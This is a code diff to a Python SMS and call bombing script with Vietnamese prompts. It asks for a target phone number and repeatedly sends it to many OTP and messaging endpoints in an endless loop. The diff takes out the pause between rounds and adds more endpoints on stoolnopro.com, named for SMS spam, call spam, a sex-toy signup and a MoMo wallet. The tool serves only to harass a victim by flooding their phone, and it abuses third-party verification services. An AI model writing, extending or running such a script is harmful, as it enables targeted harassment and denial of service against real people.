@@ -69,7 +69,6 @@ print( ' ')
 print( " ")
 
 sdt=input(str('\033[1;33mSo Dien Thoai: '))
-time_delay = random.randint(0,1)
 print('\033[1;97m===========================================================================')
 stt=0
 while True:
@@ -83,7 +82,7 @@ while True:
     string=requests.post(f'https://api-sms-v2.herokuapp.com/gojoy?phone={sdt}').text
     string=requests.post(f'https://api-sms-v2.herokuapp.com/vntrip?phone={sdt}').text
     string=requests.post(f'https://api-sms-v2.herokuapp.com/the-gioi-di-dong?phone={sdt}').text
-    print(f'\033[1;97m[{stt}]\033[1;96m Gui tin nhan den\033[1;94m-\033[1;94m{sdt}\033[1;94m-\033[1;96m thanh cong!')
-    for a in range(time_delay,0,-1):
-        print(f'Gui tin nhan tiep sau: {a} giay ', end='\r')
-        sleep(1)
+    string=requests.post(f'https://stoolnopro.com/api/spam/sms.php?phone={sdt}').text
+    string=requests.post(f'https://stoolnopro.com/api/spam/sextoy.php?phone={sdt}').text
+    string=requests.post(f'https://stoolnopro.com/api/momo/index.php?phone={sdt}').text
+    string=requests.post(f'https://stoolnopro.com/api/spam/call.php?phone={sdt}').text
